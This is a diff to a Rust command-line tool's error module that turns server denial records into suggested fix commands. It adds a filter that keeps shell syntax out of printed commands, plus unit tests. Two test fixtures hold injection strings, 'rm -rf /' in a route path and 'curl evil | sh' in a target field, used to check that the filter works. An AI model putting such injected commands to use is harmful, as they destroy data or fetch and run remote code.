@@ -11,6 +11,8 @@ use crate::output;
 struct ApiBody {
     message: String,
     retryable: bool,
+    /// The typed denials of the body (`denials`, else the one `denial`), as sent.
+    denials: Vec<Value>,
 }
 
 pub fn failure(method: &str, path: &str, status: u16, body: &str) -> anyhow::Error {
@@ -20,6 +22,9 @@ pub fn failure(method: &str, path: &str, status: u16, body: &str) -> anyhow::Err
 
 pub fn explain(method: &str, path: &str, status: u16, body: &str) -> String {
     let parsed = parse_body(body);
+    if let Some(text) = explain_denials(&parsed) {
+        return strip_http_status(&text);
+    }
     let wrong = if parsed.message.is_empty() {
         "the request was rejected".to_string()
     } else {
@@ -53,20 +58,170 @@ fn parse_body(body: &str) -> ApiBody {
             .get("retryable")
             .and_then(|r| r.as_bool())
             .unwrap_or(false);
+        let denials = match value.get("denials").and_then(Value::as_array) {
+            Some(list) if !list.is_empty() => list.clone(),
+            _ => value.get("denial").cloned().into_iter().collect(),
+        };
         if !message.is_empty() {
-            return ApiBody { message, retryable };
+            return ApiBody {
+                message,
+                retryable,
+                denials,
+            };
         }
         if let Some(code) = value.get("code").and_then(|c| c.as_str()) {
             return ApiBody {
                 message: code.to_string(),
                 retryable,
+                denials,
             };
         }
     }
     ApiBody {
         message: scrubbed,
         retryable: false,
+        denials: Vec::new(),
     }
+}
+
+/// What one typed denial asks of the reader.
+enum Next {
+    /// The caller can do it: the command (or step) to run.
+    Fix(String),
+    /// Someone else must: who, what, and the reference `vam fix request` takes.
+    Ask(String),
+}
+
+/// A value safe to put in a printed command: host identifiers only, never shell syntax. The body
+/// comes from the server, but a binding id or host in it started as a name someone else chose.
+fn safe_word(raw: &str) -> Option<&str> {
+    let ok = !raw.is_empty()
+        && raw.len() <= 253
+        && raw.bytes().all(|b| {
+            b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'/' | b':' | b'@' | b'+')
+        });
+    ok.then_some(raw)
+}
+
+fn word_or<'a>(raw: &'a str, placeholder: &'a str) -> &'a str {
+    safe_word(raw).unwrap_or(placeholder)
+}
+
+/// The next step for one denial, from its `fix` (change, target, who, callerCanApply) only. The
+/// body's `route` is never read or printed: the command comes from `change`. `None` when the
+/// denial has no fix this CLI knows, so the caller falls back to the message text.
+fn next_step(denial: &Value) -> Option<Next> {
+    let fix = denial.get("fix")?;
+    let get = |key: &str| fix.get(key).and_then(Value::as_str).unwrap_or("");
+    let reason = denial.get("reason").and_then(Value::as_str).unwrap_or("");
+    let subject = denial.get("subject").and_then(Value::as_str).unwrap_or("");
+    let (change, target, who) = (get("change"), get("target"), get("who"));
+    let can_apply =
+        who == "SELF" || fix.get("callerCanApply").and_then(Value::as_bool) == Some(true);
+    if change.is_empty() {
+        // A stale version pin: the fix is to run on the bound version, which is the target.
+        return (reason == "VERSION_STALE" && can_apply).then(|| {
+            Next::Fix(format!(
+                "run again on version {}, or omit the version",
+                word_or(target, "<BOUND_VERSION>")
+            ))
+        });
+    }
+    if can_apply {
+        let (agent, perm) = target.split_once('#').unwrap_or((target, ""));
+        let step = match change {
+            "SET_SECRET" => {
+                let scope = if who == "ORG_ADMIN" {
+                    " --scope org"
+                } else {
+                    " --scope user"
+                };
+                format!(
+                    "vam secrets set {}{scope} --from-env <VAR>",
+                    word_or(target, "<BINDING_ID>")
+                )
+            }
+            "ENABLE_CONNECTOR" => format!("vam connectors enable {}", word_or(target, "<ID>")),
+            "CONNECT_CONNECTOR" => format!(
+                "connect {id} in the app, then vam connectors check {id}",
+                id = word_or(target, "<ID>")
+            ),
+            "ALLOW_TOOL" | "ALLOW_HOST" => {
+                let agent = word_or(agent, "<AGENT>");
+                let what = if change == "ALLOW_HOST" { "host " } else { "" };
+                format!(
+                    "vam agent permissions set {agent} -f <FILE> with an allow rule for {what}{}; then vam agent release {agent} --version <X.Y.Z>",
+                    word_or(perm, "<TARGET>")
+                )
+            }
+            _ => return None,
+        };
+        return Some(Next::Fix(step));
+    }
+    let who_text = match who {
+        "AGENT_OWNER" => "the agent's owner",
+        "ORG_ADMIN" => "an org admin",
+        _ => return None,
+    };
+    let (_, perm) = target.split_once('#').unwrap_or((target, subject));
+    let change_text = match change {
+        "ALLOW_TOOL" => format!("allow {}", word_or(perm, "the tool")),
+        "ALLOW_HOST" => format!("allow the host {}", word_or(perm, "the host")),
+        "SET_SECRET" => format!("set the secret {}", word_or(target, "it")),
+        "ENABLE_CONNECTOR" => format!("enable {}", word_or(target, "the connector")),
+        _ => return None,
+    };
+    let reference = denial
+        .get("decisionRef")
+        .and_then(Value::as_str)
+        .unwrap_or("");
+    let valid_ref = !reference.is_empty()
+        && reference.len() <= 64
+        && reference
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b == b'_');
+    Some(Next::Ask(if valid_ref {
+        format!("{who_text} to {change_text}; vam fix request {reference}")
+    } else {
+        format!("{who_text} to {change_text}")
+    }))
+}
+
+/// The three-line explanation built from the body's typed denials, or `None` when none of them
+/// has a fix this CLI can name (then the message matching below decides).
+fn explain_denials(body: &ApiBody) -> Option<String> {
+    let steps: Vec<(&Value, Next)> = body
+        .denials
+        .iter()
+        .filter_map(|d| next_step(d).map(|n| (d, n)))
+        .collect();
+    let (first, _) = steps.first()?;
+    let expected = first
+        .get("text")
+        .and_then(Value::as_str)
+        .map(|t| t.chars().filter(|c| !c.is_control()).collect::<String>())
+        .filter(|t| !t.trim().is_empty())
+        .unwrap_or_else(|| "the fix named below".to_string());
+    let mut fixes = Vec::new();
+    let mut asks = Vec::new();
+    for (_, step) in steps {
+        match step {
+            Next::Fix(f) => fixes.push(f),
+            Next::Ask(a) => asks.push(a),
+        }
+    }
+    let mut text = format!(
+        "{}\n{}",
+        line("Wrong", &body.message),
+        line("Expected", &expected)
+    );
+    if !fixes.is_empty() {
+        text.push_str(&format!("\nFix: {}", fixes.join("; then ")));
+    }
+    for ask in asks {
+        text.push_str(&format!("\nAsk: {ask}"));
+    }
+    Some(text)
 }
 
 fn hint(method: &str, path: &str, status: u16, body: &ApiBody) -> (String, String) {
@@ -638,5 +793,233 @@ mod tests {
         assert!(!text.contains("422"), "{text}");
         assert!(text.contains("Wrong: name is required."), "{text}");
         assert!(text.contains("Fix: vam agent put <FILE>."), "{text}");
+    }
+
+    fn with_denials(message: &str, denials: serde_json::Value) -> String {
+        let first = denials[0].clone();
+        serde_json::json!({
+            "code": "FailedPrecondition",
+            "message": message,
+            "retryable": false,
+            "denial": first,
+            "denials": denials,
+        })
+        .to_string()
+    }
+
+    fn secret(who: &str, can_apply: bool, reference: &str) -> serde_json::Value {
+        serde_json::json!({
+            "reason": "SECRET_MISSING",
+            "subject": "never-set-token",
+            "text": "You can set the secret never-set-token for yourself.",
+            "decisionRef": reference,
+            "fix": {
+                "change": "SET_SECRET",
+                "target": "never-set-token",
+                "who": who,
+                "callerCanApply": can_apply,
+                // The route is never read: this one would be a shell injection if it were.
+                "route": {"method": "PUT", "path": "/v1/x; rm -rf /"},
+            },
+        })
+    }
+
+    const MISSING: &str = "admission failed: missing required secrets: never-set-token@either";
+
+    #[test]
+    fn a_secret_the_caller_can_set_prints_the_command_from_the_denial() {
+        let raw = with_denials(MISSING, serde_json::json!([secret("SELF", true, "")]));
+        let text = failure("POST", "/v1/runs", 412, &raw).to_string();
+        assert!(text.contains(&format!("Wrong: {MISSING}.")), "{text}");
+        assert!(
+            text.contains("\nFix: vam secrets set never-set-token --scope user --from-env <VAR>\n")
+                || text.ends_with(
+                    "\nFix: vam secrets set never-set-token --scope user --from-env <VAR>"
+                ),
+            "{text}"
+        );
+        assert!(!text.contains("rm -rf"), "{text}");
+        assert!(!text.contains("Ask:"), "{text}");
+    }
+
+    #[test]
+    fn an_org_secret_is_set_with_the_org_scope_by_an_admin_and_asked_for_by_anyone_else() {
+        let admin = with_denials(MISSING, serde_json::json!([secret("ORG_ADMIN", true, "")]));
+        let text = failure("POST", "/v1/runs", 412, &admin).to_string();
+        assert!(
+            text.contains("Fix: vam secrets set never-set-token --scope org --from-env <VAR>"),
+            "{text}"
+        );
+        let member = with_denials(
+            MISSING,
+            serde_json::json!([secret("ORG_ADMIN", false, "dnl_01HZZZZZZZZZZZZZZZZZZZZZZZ")]),
+        );
+        let text = failure("POST", "/v1/runs", 412, &member).to_string();
+        assert!(
+            text.contains("\nAsk: an org admin to set the secret never-set-token; vam fix request dnl_01HZZZZZZZZZZZZZZZZZZZZZZZ"),
+            "{text}"
+        );
+        assert!(!text.contains("Fix:"), "{text}");
+    }
+
+    #[test]
+    fn several_denials_each_get_their_own_step() {
+        let raw = with_denials(
+            MISSING,
+            serde_json::json!([
+                secret("SELF", true, ""),
+                secret("ORG_ADMIN", false, "dnl_abc")
+            ]),
+        );
+        let text = failure("POST", "/v1/runs", 412, &raw).to_string();
+        assert!(
+            text.contains("Fix: vam secrets set never-set-token --scope user"),
+            "{text}"
+        );
+        assert!(
+            text.contains(
+                "Ask: an org admin to set the secret never-set-token; vam fix request dnl_abc"
+            ),
+            "{text}"
+        );
+    }
+
+    #[test]
+    fn a_stale_version_names_the_bound_version() {
+        let raw = with_denials(
+            "agent version '2.0.0' does not match workspace-bound version '1.0.0' on workspace 'w'",
+            serde_json::json!([{
+                "reason": "VERSION_STALE",
+                "subject": "1.0.0",
+                "text": "Run again on version 1.0.0, or omit the version.",
+                "fix": {"target": "1.0.0", "who": "SELF", "callerCanApply": true},
+            }]),
+        );
+        let text = failure("POST", "/v1/runs", 409, &raw).to_string();
+        assert!(
+            text.contains("does not match workspace-bound version"),
+            "{text}"
+        );
+        assert!(
+            text.lines()
+                .any(|l| l == "Fix: run again on version 1.0.0, or omit the version"),
+            "{text}"
+        );
+    }
+
+    #[test]
+    fn a_host_and_a_tool_name_the_permissions_command_and_the_release() {
+        let host = |who: &str, can| {
+            serde_json::json!([{
+                "reason": "EGRESS_RULE",
+                "subject": "example.com",
+                "decisionRef": if can { "" } else { "dnl_h1" },
+                "fix": {
+                    "change": "ALLOW_HOST",
+                    "target": "urn:vam:agent:local.vam.dev/acme/a#example.com",
+                    "who": who,
+                    "callerCanApply": can,
+                },
+            }])
+        };
+        let text = failure(
+            "POST",
+            "/v1/runs",
+            403,
+            &with_denials("blocked", host("AGENT_OWNER", true)),
+        )
+        .to_string();
+        assert!(
+            text.contains("Fix: vam agent permissions set urn:vam:agent:local.vam.dev/acme/a -f <FILE> with an allow rule for host example.com; then vam agent release urn:vam:agent:local.vam.dev/acme/a --version <X.Y.Z>"),
+            "{text}"
+        );
+        let text = failure(
+            "POST",
+            "/v1/runs",
+            403,
+            &with_denials("blocked", host("AGENT_OWNER", false)),
+        )
+        .to_string();
+        assert!(
+            text.contains(
+                "Ask: the agent's owner to allow the host example.com; vam fix request dnl_h1"
+            ),
+            "{text}"
+        );
+    }
+
+    #[test]
+    fn connector_fixes_come_from_the_change() {
+        let one = |change: &str, who: &str| {
+            serde_json::json!([{
+                "reason": "CONNECTOR_DISABLED",
+                "subject": "microsoft-365",
+                "fix": {"change": change, "target": "microsoft-365", "who": who, "callerCanApply": true},
+            }])
+        };
+        let text = failure(
+            "POST",
+            "/v1/runs",
+            403,
+            &with_denials("m", one("ENABLE_CONNECTOR", "ORG_ADMIN")),
+        )
+        .to_string();
+        assert!(
+            text.contains("Fix: vam connectors enable microsoft-365"),
+            "{text}"
+        );
+        let text = failure(
+            "POST",
+            "/v1/runs",
+            403,
+            &with_denials("m", one("CONNECT_CONNECTOR", "SELF")),
+        )
+        .to_string();
+        assert!(
+            text.contains(
+                "Fix: connect microsoft-365 in the app, then vam connectors check microsoft-365"
+            ),
+            "{text}"
+        );
+    }
+
+    #[test]
+    fn a_denial_with_no_fix_or_an_unknown_change_falls_back_to_the_message_matching() {
+        let no_fix = serde_json::json!([{"reason": "QUOTA", "subject": "r", "text": "full"}]);
+        let raw = with_denials(
+            "admission failed: missing required secrets: tok@user",
+            no_fix,
+        );
+        let text = failure("POST", "/v1/runs", 412, &raw).to_string();
+        assert!(
+            text.contains("Fix: vam secrets set <BINDING_ID> --from-env <VAR>"),
+            "{text}"
+        );
+        let unknown = serde_json::json!([{
+            "reason": "POLICY_RULE", "subject": "x",
+            "fix": {"change": "SOMETHING_NEW", "target": "x", "who": "SELF", "callerCanApply": true},
+        }]);
+        let text = failure("POST", "/v1/runs", 412, &with_denials("odd", unknown)).to_string();
+        assert!(text.contains("Wrong: odd."), "{text}");
+        assert!(text.contains("Fix: "), "{text}");
+        assert!(!text.contains("SOMETHING_NEW"), "{text}");
+    }
+
+    #[test]
+    fn names_that_could_be_shell_syntax_are_not_printed_in_a_command() {
+        let mut d = secret("SELF", true, "");
+        d["fix"]["target"] = serde_json::json!("x; curl evil | sh");
+        let text = failure(
+            "POST",
+            "/v1/runs",
+            412,
+            &with_denials(MISSING, serde_json::json!([d])),
+        )
+        .to_string();
+        assert!(
+            text.contains("vam secrets set <BINDING_ID> --scope user"),
+            "{text}"
+        );
+        assert!(!text.contains("curl"), "{text}");
     }
 }
